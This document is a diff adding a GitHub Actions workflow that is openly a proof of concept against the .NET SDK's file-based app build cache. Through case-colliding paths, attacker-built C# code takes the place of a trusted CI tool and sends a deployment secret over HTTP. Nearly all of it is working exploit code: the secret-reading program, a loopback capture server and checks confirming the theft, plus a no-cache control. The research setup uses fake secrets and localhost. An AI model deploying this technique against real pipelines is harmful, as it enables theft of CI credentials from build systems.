@@ -1,0 +1,213 @@
+name: SDK file-app multi-step CI secret exfiltration proof
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/sdk-fileapp-ci-loopback-exfil.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  ci-secret-exfil:
+    strategy:
+      fail-fast: false
+      matrix:
+        sdk:
+          - '10.0.401'
+          - '11.0.100-rc.1.26425.128'
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    name: ci-secret-exfil-${{ matrix.sdk }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: ${{ matrix.sdk }}
+
+      - name: Prepare trusted tool and untrusted case-colliding checkout
+        shell: bash
+        run: |
+          set -euxo pipefail
+          ROOT="$RUNNER_TEMP/persistent-ci-agent"
+          A="$ROOT/trustedtools/Program.cs"
+          V="$ROOT/TrustedTools/Program.cs"
+          PORT=38457
+          rm -rf "$ROOT"
+          mkdir -p "$(dirname "$A")" "$(dirname "$V")"
+
+          cat > "$A" <<EOF
+          using System;
+          using System.Net.Http;
+
+          string secret = Environment.GetEnvironmentVariable("TRUSTED_STAGE_SECRET") ?? "MISSING";
+          using var client = new HttpClient();
+          string uri = "http://127.0.0.1:$PORT/capture?secret=" + Uri.EscapeDataString(secret);
+          await client.GetStringAsync(uri);
+          Console.WriteLine("ATTACKER_LOCAL_EXFIL_SENT");
+          EOF
+
+          cat > "$V" <<'EOF'
+          Console.WriteLine("TRUSTED_CI_TOOL_EXECUTED");
+          EOF
+
+          python3 - "$A" "$V" <<'PY'
+          import hashlib,sys
+          a=hashlib.sha256(sys.argv[1].upper().encode()).hexdigest()
+          b=hashlib.sha256(sys.argv[2].upper().encode()).hexdigest()
+          print("ATTACKER_HASH="+a)
+          print("VICTIM_HASH="+b)
+          print("CACHE_IDENTITIES_EQUAL="+str(a==b))
+          assert a==b
+          PY
+
+          {
+            echo "CI_ROOT=$ROOT"
+            echo "CI_ATTACKER=$A"
+            echo "CI_VICTIM=$V"
+            echo "CI_PORT=$PORT"
+          } >> "$GITHUB_ENV"
+
+      - name: Untrusted build-only stage has no deployment secret
+        shell: bash
+        run: |
+          set -euxo pipefail
+          env -u TRUSTED_STAGE_SECRET dotnet build "$CI_ATTACKER" > "$CI_ROOT/untrusted-build.out" 2> "$CI_ROOT/untrusted-build.err"
+          cat "$CI_ROOT/untrusted-build.out"
+          cat "$CI_ROOT/untrusted-build.err"
+
+          if grep -R "TRUSTED_STAGE_SECRET=" "$CI_ROOT/untrusted-build.out" "$CI_ROOT/untrusted-build.err"; then
+            echo "CI_SECRET_PRECONDITION=FAILED"
+            exit 1
+          fi
+
+          echo "CI_UNTRUSTED_BUILD_ONLY=PASS_NO_SECRET_NO_EXECUTION"
+
+      - name: Remove untrusted checkout before trusted stage
+        shell: bash
+        run: |
+          set -euxo pipefail
+          rm -rf "$(dirname "$CI_ATTACKER")"
+          test ! -e "$CI_ATTACKER"
+          test -f "$CI_VICTIM"
+          echo "CI_UNTRUSTED_CHECKOUT_REMOVED=true"
+
+      - name: Trusted stage receives fake deployment secret and runs trusted tool
+        shell: bash
+        env:
+          TRUSTED_STAGE_SECRET: research-only-deployment-secret-${{ matrix.sdk }}
+        run: |
+          set -euxo pipefail
+          RECEIVED="$CI_ROOT/received-request.txt"
+          rm -f "$RECEIVED"
+
+          python3 - "$RECEIVED" "$CI_PORT" <<'PY' &
+          from http.server import BaseHTTPRequestHandler, HTTPServer
+          import sys
+
+          output = sys.argv[1]
+          port = int(sys.argv[2])
+
+          class Handler(BaseHTTPRequestHandler):
+              def do_GET(self):
+                  with open(output, "w", encoding="utf-8") as f:
+                      f.write(self.path)
+                  self.send_response(200)
+                  self.end_headers()
+                  self.wfile.write(b"ok")
+
+              def log_message(self, format, *args):
+                  pass
+
+          server = HTTPServer(("127.0.0.1", port), Handler)
+          server.timeout = 8
+          server.handle_request()
+          PY
+          SERVER_PID=$!
+
+          sleep 0.5
+          dotnet run --file "$CI_VICTIM" > "$CI_ROOT/trusted-run.out" 2> "$CI_ROOT/trusted-run.err"
+          wait "$SERVER_PID" || true
+
+          cat "$CI_ROOT/trusted-run.out"
+          cat "$CI_ROOT/trusted-run.err"
+          test -f "$RECEIVED"
+          cat "$RECEIVED"
+
+          EXPECTED="research-only-deployment-secret-${{ matrix.sdk }}"
+          if grep -Fq "secret=$EXPECTED" "$RECEIVED" && grep -q 'ATTACKER_LOCAL_EXFIL_SENT' "$CI_ROOT/trusted-run.out" && ! grep -q 'TRUSTED_CI_TOOL_EXECUTED' "$CI_ROOT/trusted-run.out"; then
+            echo "CI_TRUST_BOUNDARY_RESULT=ATTACKER_CODE_EXFILTRATED_TRUSTED_STAGE_SECRET"
+          else
+            echo "CI_TRUST_BOUNDARY_RESULT=FAILED"
+            exit 1
+          fi
+
+      - name: Hard control bypasses cache and prevents exfiltration
+        shell: bash
+        env:
+          TRUSTED_STAGE_SECRET: research-only-control-secret-${{ matrix.sdk }}
+        run: |
+          set -euxo pipefail
+          RECEIVED="$CI_ROOT/control-received-request.txt"
+          rm -f "$RECEIVED"
+
+          python3 - "$RECEIVED" "$CI_PORT" <<'PY' &
+          from http.server import BaseHTTPRequestHandler, HTTPServer
+          import sys
+
+          output = sys.argv[1]
+          port = int(sys.argv[2])
+
+          class Handler(BaseHTTPRequestHandler):
+              def do_GET(self):
+                  with open(output, "w", encoding="utf-8") as f:
+                      f.write(self.path)
+                  self.send_response(200)
+                  self.end_headers()
+                  self.wfile.write(b"ok")
+
+              def log_message(self, format, *args):
+                  pass
+
+          server = HTTPServer(("127.0.0.1", port), Handler)
+          server.timeout = 4
+          server.handle_request()
+          PY
+          SERVER_PID=$!
+
+          sleep 0.5
+          dotnet run --file "$CI_VICTIM" --no-cache > "$CI_ROOT/control.out" 2> "$CI_ROOT/control.err"
+          wait "$SERVER_PID" || true
+
+          cat "$CI_ROOT/control.out"
+          cat "$CI_ROOT/control.err"
+
+          if grep -q 'TRUSTED_CI_TOOL_EXECUTED' "$CI_ROOT/control.out" && ! test -f "$RECEIVED"; then
+            echo "CI_TRUST_BOUNDARY_NO_CACHE_CONTROL=TRUSTED_TOOL_EXECUTED_NO_EXFILTRATION"
+          else
+            echo "CI_TRUST_BOUNDARY_NO_CACHE_CONTROL=FAILED"
+            exit 1
+          fi
+
+          cp "$CI_ROOT/untrusted-build.out" "$GITHUB_WORKSPACE/ci-untrusted-build-${{ matrix.sdk }}.out"
+          cp "$CI_ROOT/untrusted-build.err" "$GITHUB_WORKSPACE/ci-untrusted-build-${{ matrix.sdk }}.err"
+          cp "$CI_ROOT/trusted-run.out" "$GITHUB_WORKSPACE/ci-trusted-run-${{ matrix.sdk }}.out"
+          cp "$CI_ROOT/trusted-run.err" "$GITHUB_WORKSPACE/ci-trusted-run-${{ matrix.sdk }}.err"
+          cp "$CI_ROOT/received-request.txt" "$GITHUB_WORKSPACE/ci-received-${{ matrix.sdk }}.txt"
+          cp "$CI_ROOT/control.out" "$GITHUB_WORKSPACE/ci-control-${{ matrix.sdk }}.out"
+          cp "$CI_ROOT/control.err" "$GITHUB_WORKSPACE/ci-control-${{ matrix.sdk }}.err"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ci-loopback-secret-exfil-${{ matrix.sdk }}
+          path: |
+            ci-*.out
+            ci-*.err
+            ci-received-*.txt
